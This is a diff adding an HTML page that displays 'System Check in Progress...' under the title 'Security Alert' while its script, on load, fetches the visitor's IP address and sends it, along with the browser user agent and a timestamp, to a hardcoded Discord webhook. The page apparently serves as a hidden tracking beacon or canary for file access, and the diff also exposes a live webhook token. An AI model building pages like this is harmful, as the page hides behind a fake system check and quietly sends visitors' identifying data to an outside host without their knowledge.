@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Security Alert</title>
+</head>
+<body>
+    <h1>System Check in Progress...</h1>
+    
+    <script>
+        async function sendNotification() {
+            try {
+                // 1. Get the visitor's IP address
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ipAddress = ipData.ip;
+
+                // 2. Your Discord Webhook URL
+                const webhookUrl = 'https://discord.com/api/webhooks/1481436589040336927/nY8_J4u1yHlAxIuPkuYyRWLLfPDyahmkQz9WIek9uIQTOloy9iAuIF_RGh_kh-eEHzbC';
+
+                // 3. Create the message payload
+                const payload = {
+                    username: "Security Monitor",
+                    embeds: [{
+                        title: "🚨 Alert: File Accessed",
+                        color: 16711680, // Red color
+                        fields: [
+                            { name: "IP Address", value: ipAddress, inline: true },
+                            { name: "User Agent", value: navigator.userAgent, inline: false },
+                            { name: "Timestamp", value: new Date().toLocaleString(), inline: true }
+                        ]
+                    }]
+                };
+
+                // 4. Send the data to Discord
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                console.log('Notification sent successfully.');
+            } catch (error) {
+                console.error('Process failed:', error);
+            }
+        }
+
+        sendNotification();
+    </script>
+</body>
+</html>
